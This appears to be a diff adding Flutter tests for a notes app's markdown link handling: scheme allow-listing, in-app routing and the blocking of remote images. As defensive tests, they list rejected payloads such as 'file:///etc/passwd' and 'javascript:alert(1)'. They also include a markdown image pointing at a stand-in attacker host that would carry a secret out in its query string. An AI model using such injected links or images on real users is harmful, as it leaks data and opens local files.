@@ -1,0 +1,480 @@
+import 'package:flutter/services.dart';
+import 'package:flutter_test/flutter_test.dart';
+import 'package:glados/glados.dart' as glados;
+import 'package:gpt_markdown/gpt_markdown.dart';
+import 'package:lotti/features/design_system/theme/icon_tokens.dart';
+import 'package:lotti/get_it.dart';
+import 'package:lotti/services/nav_service.dart';
+import 'package:lotti/widgets/markdown_link_utils.dart';
+import 'package:material_ui/material_ui.dart';
+import 'package:mocktail/mocktail.dart';
+import 'package:url_launcher_platform_interface/url_launcher_platform_interface.dart';
+
+import '../mocks/mocks.dart';
+import '../widget_test_utils.dart';
+
+/// Renders [markdown] the way owners with focusable links do.
+Future<void> _pumpFocusableLink(
+  WidgetTester tester,
+  String markdown, {
+  void Function(String url, String title)? onLinkTap,
+}) async {
+  await tester.pumpWidget(
+    makeTestableWidgetWithScaffold(
+      GptMarkdown(
+        markdown,
+        onLinkTap: onLinkTap,
+        styleSheet: markdownLinkStyleSheet(Colors.red),
+        inlineLinkBuilder: buildFocusableMarkdownLink,
+      ),
+    ),
+  );
+  await tester.pump();
+}
+
+void main() {
+  group('handleMarkdownLinkTap', () {
+    late MockUrlLauncher mockUrlLauncher;
+    late UrlLauncherPlatform originalInstance;
+
+    setUp(() {
+      originalInstance = UrlLauncherPlatform.instance;
+      mockUrlLauncher = MockUrlLauncher();
+      UrlLauncherPlatform.instance = mockUrlLauncher;
+      registerFallbackValue(FakeLaunchOptions());
+    });
+
+    tearDown(() {
+      UrlLauncherPlatform.instance = originalInstance;
+    });
+
+    test('launches valid URL externally', () async {
+      when(
+        () => mockUrlLauncher.launchUrl(any(), any()),
+      ).thenAnswer((_) async => true);
+
+      await handleMarkdownLinkTap('https://example.com', 'Example');
+
+      verify(
+        () => mockUrlLauncher.launchUrl(
+          'https://example.com',
+          any(),
+        ),
+      ).called(1);
+    });
+
+    test('does not launch when URL is empty', () async {
+      await handleMarkdownLinkTap('', '');
+
+      verifyNever(() => mockUrlLauncher.launchUrl(any(), any()));
+    });
+
+    test('does not launch when URL has no scheme', () async {
+      await handleMarkdownLinkTap('example.com/path', '');
+
+      verifyNever(() => mockUrlLauncher.launchUrl(any(), any()));
+    });
+
+    test('launches http and mailto links too, whatever their case', () async {
+      when(
+        () => mockUrlLauncher.launchUrl(any(), any()),
+      ).thenAnswer((_) async => true);
+
+      await handleMarkdownLinkTap('http://example.com', 'Plain');
+      await handleMarkdownLinkTap('mailto:someone@example.com', 'Mail');
+      await handleMarkdownLinkTap('HTTPS://example.com/Upper', 'Upper');
+
+      final launched = verify(
+        () => mockUrlLauncher.launchUrl(captureAny(), any()),
+      ).captured;
+      expect(launched, [
+        'http://example.com',
+        'mailto:someone@example.com',
+        // Uri normalises the scheme, so the allow-list sees it lower-cased.
+        'https://example.com/Upper',
+      ]);
+    });
+
+    test('never hands any other scheme to another app', () async {
+      // Model-written or synced markdown must not put a file, intent,
+      // script or custom app handler one tap away.
+      for (final url in [
+        'file:///etc/passwd',
+        'intent://scan/#Intent;scheme=zxing;end',
+        'javascript:alert(1)',
+        'tel:+15555550100',
+        'sms:+15555550100',
+        'otherapp://do/something',
+        'lotti://unknown/route',
+      ]) {
+        await handleMarkdownLinkTap(url, 'Link');
+      }
+
+      verifyNever(() => mockUrlLauncher.launchUrl(any(), any()));
+    });
+
+    test('routes app-local task paths through NavService', () async {
+      getIt.pushNewScope();
+      final mockNavService = MockNavService();
+      getIt.registerSingleton<NavService>(mockNavService);
+      addTearDown(() async {
+        await getIt.resetScope();
+        await getIt.popScope();
+      });
+
+      await handleMarkdownLinkTap('/tasks/task-123', 'Task');
+
+      verify(() => mockNavService.beamToNamed('/tasks/task-123')).called(1);
+      verifyNever(() => mockUrlLauncher.launchUrl(any(), any()));
+    });
+
+    test('ignores bare relative paths instead of routing them', () async {
+      getIt.pushNewScope();
+      final mockNavService = MockNavService();
+      getIt.registerSingleton<NavService>(mockNavService);
+      addTearDown(() async {
+        await getIt.resetScope();
+        await getIt.popScope();
+      });
+
+      await handleMarkdownLinkTap('tasks/task-123', 'Task');
+
+      verifyNever(() => mockNavService.beamToNamed(any()));
+      verifyNever(() => mockUrlLauncher.launchUrl(any(), any()));
+    });
+
+    test('routes lotti task URLs through NavService', () async {
+      getIt.pushNewScope();
+      final mockNavService = MockNavService();
+      getIt.registerSingleton<NavService>(mockNavService);
+      addTearDown(() async {
+        await getIt.resetScope();
+        await getIt.popScope();
+      });
+
+      await handleMarkdownLinkTap('lotti://tasks/task-456', 'Task');
+
+      verify(() => mockNavService.beamToNamed('/tasks/task-456')).called(1);
+      verifyNever(() => mockUrlLauncher.launchUrl(any(), any()));
+    });
+
+    test(
+      'routes lotti URLs with a path but no host through NavService',
+      () async {
+        getIt.pushNewScope();
+        final mockNavService = MockNavService();
+        getIt.registerSingleton<NavService>(mockNavService);
+        addTearDown(() async {
+          await getIt.resetScope();
+          await getIt.popScope();
+        });
+
+        await handleMarkdownLinkTap('lotti:/tasks/task-789', 'Task');
+
+        verify(() => mockNavService.beamToNamed('/tasks/task-789')).called(1);
+        verifyNever(() => mockUrlLauncher.launchUrl(any(), any()));
+      },
+    );
+
+    test('handles URL with special characters', () async {
+      when(
+        () => mockUrlLauncher.launchUrl(any(), any()),
+      ).thenAnswer((_) async => true);
+
+      await handleMarkdownLinkTap(
+        'https://example.com/path?q=hello%20world&lang=en',
+        'Search',
+      );
+
+      verify(
+        () => mockUrlLauncher.launchUrl(
+          'https://example.com/path?q=hello%20world&lang=en',
+          any(),
+        ),
+      ).called(1);
+    });
+
+    glados.Glados(
+      glados.any.generatedInternalMarkdownRoute,
+      glados.ExploreConfig(numRuns: 160),
+    ).test(
+      'routes generated app-local markdown URLs through NavService',
+      (scenario) async {
+        getIt.pushNewScope();
+        final mockNavService = MockNavService();
+        getIt.registerSingleton<NavService>(mockNavService);
+
+        try {
+          await handleMarkdownLinkTap(scenario.url, 'Generated');
+
+          verify(
+            () => mockNavService.beamToNamed(scenario.expectedRoute),
+          ).called(1);
+          verifyNever(() => mockUrlLauncher.launchUrl(any(), any()));
+        } finally {
+          await getIt.resetScope();
+          await getIt.popScope();
+        }
+      },
+      tags: 'glados',
+    );
+  });
+
+  group('buildBlockedMarkdownImage', () {
+    Future<void> pumpImage(WidgetTester tester, String markdown) async {
+      await tester.pumpWidget(
+        makeTestableWidgetWithScaffold(
+          GptMarkdown(markdown, imageBuilder: buildBlockedMarkdownImage),
+        ),
+      );
+      await tester.pump();
+    }
+
+    testWidgets('shows where the image is from instead of fetching it', (
+      tester,
+    ) async {
+      final semantics = tester.ensureSemantics();
+      // The query string is what an injected URL would smuggle out.
+      await pumpImage(
+        tester,
+        'Before ![chart](https://attacker.example/p.png?d=secret) after',
+      );
+
+      expect(find.byType(Image), findsNothing);
+      expect(find.text('Image from attacker.example not loaded'), findsOne);
+      expect(find.byIcon(LottiIcons.imageBroken), findsOne);
+      // Inline in the paragraph, so its label merges into the paragraph's
+      // semantics node rather than standing alone.
+      expect(
+        find.bySemanticsLabel(RegExp('Image from attacker.example not loaded')),
+        findsOne,
+      );
+      semantics.dispose();
+    });
+
+    testWidgets('names the whole URL when it has no host', (tester) async {
+      await pumpImage(tester, '![local](images/diagram.png)');
+
+      expect(find.byType(Image), findsNothing);
+      expect(find.text('Image from images/diagram.png not loaded'), findsOne);
+    });
+  });
+
+  group('markdownLinkStyleSheet', () {
+    test('colours links the same at rest and on hover', () {
+      final link = markdownLinkStyleSheet(Colors.green).link!;
+
+      expect(link.color, Colors.green);
+      expect(link.hoverColor, Colors.green);
+    });
+  });
+
+  group('buildFocusableMarkdownLink', () {
+    testWidgets('a tap activates onLinkTap once with url and label', (
+      tester,
+    ) async {
+      final visited = <(String, String)>[];
+      await _pumpFocusableLink(
+        tester,
+        'See [Open task](/tasks/task-789) now.',
+        onLinkTap: (url, title) => visited.add((url, title)),
+      );
+
+      await tester.tap(find.text('Open task'));
+      await tester.pump();
+
+      expect(visited, [('/tasks/task-789', 'Open task')]);
+    });
+
+    testWidgets('Enter on the focused link activates it', (tester) async {
+      final visited = <String>[];
+      await _pumpFocusableLink(
+        tester,
+        '[Open task](/tasks/task-789)',
+        onLinkTap: (url, _) => visited.add(url),
+      );
+
+      await tester.sendKeyEvent(LogicalKeyboardKey.tab);
+      await tester.sendKeyEvent(LogicalKeyboardKey.enter);
+      await tester.pump();
+
+      expect(visited, ['/tasks/task-789']);
+    });
+
+    testWidgets('renders the label underlined in the style-sheet colour', (
+      tester,
+    ) async {
+      await _pumpFocusableLink(
+        tester,
+        '[Red link](https://example.com)',
+        onLinkTap: (_, _) {},
+      );
+
+      final inkWell = tester.widget<InkWell>(find.byType(InkWell));
+      expect(inkWell.mouseCursor, SystemMouseCursors.click);
+
+      final text = tester.widget<Text>(
+        find.descendant(of: find.byType(InkWell), matching: find.byType(Text)),
+      );
+      final span = text.textSpan! as TextSpan;
+      expect(span.toPlainText(), 'Red link');
+      expect(span.style!.color, Colors.red);
+      expect(span.style!.decoration, TextDecoration.underline);
+    });
+
+    testWidgets('is announced as a link', (tester) async {
+      await _pumpFocusableLink(
+        tester,
+        '[Accessible link](https://example.com)',
+        onLinkTap: (_, _) {},
+      );
+
+      expect(
+        find.ancestor(
+          of: find.byType(InkWell),
+          matching: find.byWidgetPredicate(
+            (widget) => widget is Semantics && widget.properties.link == true,
+          ),
+        ),
+        findsOneWidget,
+      );
+    });
+
+    testWidgets('is inert without an onLinkTap handler', (tester) async {
+      await _pumpFocusableLink(tester, '[Inert](https://example.com)');
+
+      expect(tester.widget<InkWell>(find.byType(InkWell)).onTap, isNull);
+    });
+  });
+}
+
+enum _GeneratedMarkdownRouteRoot {
+  calendar,
+  dashboards,
+  habits,
+  journal,
+  projects,
+  settings,
+  tasks,
+}
+
+enum _GeneratedMarkdownRouteShape {
+  absolutePath,
+  lottiHost,
+  lottiPath,
+}
+
+enum _GeneratedMarkdownPathSegment {
+  alpha,
+  numeric,
+  dashed,
+  underscored,
+}
+
+enum _GeneratedMarkdownQueryValue {
+  none,
+  alpha,
+  encodedSpace,
+  numeric,
+}
+
+class _GeneratedInternalMarkdownRoute {
+  const _GeneratedInternalMarkdownRoute({
+    required this.root,
+    required this.shape,
+    required this.segments,
+    required this.queryValue,
+  });
+
+  final _GeneratedMarkdownRouteRoot root;
+  final _GeneratedMarkdownRouteShape shape;
+  final List<_GeneratedMarkdownPathSegment> segments;
+  final _GeneratedMarkdownQueryValue queryValue;
+
+  String get path {
+    final suffix = segments.isEmpty
+        ? ''
+        : '/${segments.map((segment) => segment.text).join('/')}';
+    return '${root.path}$suffix';
+  }
+
+  String get query => switch (queryValue) {
+    _GeneratedMarkdownQueryValue.none => '',
+    _GeneratedMarkdownQueryValue.alpha => 'q=alpha',
+    _GeneratedMarkdownQueryValue.encodedSpace => 'q=hello%20world',
+    _GeneratedMarkdownQueryValue.numeric => 'page=2',
+  };
+
+  String get expectedRoute => query.isEmpty ? path : '$path?$query';
+
+  String get url {
+    final withQuery = query.isEmpty ? path : '$path?$query';
+    return switch (shape) {
+      _GeneratedMarkdownRouteShape.absolutePath => withQuery,
+      _GeneratedMarkdownRouteShape.lottiHost =>
+        'lotti://${withQuery.substring(1)}',
+      _GeneratedMarkdownRouteShape.lottiPath => 'lotti:$withQuery',
+    };
+  }
+
+  @override
+  String toString() {
+    return '_GeneratedInternalMarkdownRoute('
+        'url: $url, '
+        'expectedRoute: $expectedRoute)';
+  }
+}
+
+extension on _GeneratedMarkdownRouteRoot {
+  String get path => switch (this) {
+    _GeneratedMarkdownRouteRoot.calendar => '/calendar',
+    _GeneratedMarkdownRouteRoot.dashboards => '/dashboards',
+    _GeneratedMarkdownRouteRoot.habits => '/habits',
+    _GeneratedMarkdownRouteRoot.journal => '/journal',
+    _GeneratedMarkdownRouteRoot.projects => '/projects',
+    _GeneratedMarkdownRouteRoot.settings => '/settings',
+    _GeneratedMarkdownRouteRoot.tasks => '/tasks',
+  };
+}
+
+extension on _GeneratedMarkdownPathSegment {
+  String get text => switch (this) {
+    _GeneratedMarkdownPathSegment.alpha => 'alpha',
+    _GeneratedMarkdownPathSegment.numeric => '2024',
+    _GeneratedMarkdownPathSegment.dashed => 'dash-name',
+    _GeneratedMarkdownPathSegment.underscored => 'under_score',
+  };
+}
+
+extension _AnyMarkdownLinkUtils on glados.Any {
+  glados.Generator<_GeneratedMarkdownRouteRoot> get _routeRoot =>
+      glados.AnyUtils(this).choose(_GeneratedMarkdownRouteRoot.values);
+
+  glados.Generator<_GeneratedMarkdownRouteShape> get _routeShape =>
+      glados.AnyUtils(this).choose(_GeneratedMarkdownRouteShape.values);
+
+  glados.Generator<_GeneratedMarkdownPathSegment> get _pathSegment =>
+      glados.AnyUtils(this).choose(_GeneratedMarkdownPathSegment.values);
+
+  glados.Generator<_GeneratedMarkdownQueryValue> get _queryValue =>
+      glados.AnyUtils(this).choose(_GeneratedMarkdownQueryValue.values);
+
+  glados.Generator<_GeneratedInternalMarkdownRoute>
+  get generatedInternalMarkdownRoute => glados.CombinableAny(this).combine4(
+    _routeRoot,
+    _routeShape,
+    glados.ListAnys(this).listWithLengthInRange(0, 3, _pathSegment),
+    _queryValue,
+    (
+      _GeneratedMarkdownRouteRoot root,
+      _GeneratedMarkdownRouteShape shape,
+      List<_GeneratedMarkdownPathSegment> segments,
+      _GeneratedMarkdownQueryValue queryValue,
+    ) => _GeneratedInternalMarkdownRoute(
+      root: root,
+      shape: shape,
+      segments: segments,
+      queryValue: queryValue,
+    ),
+  );
+}
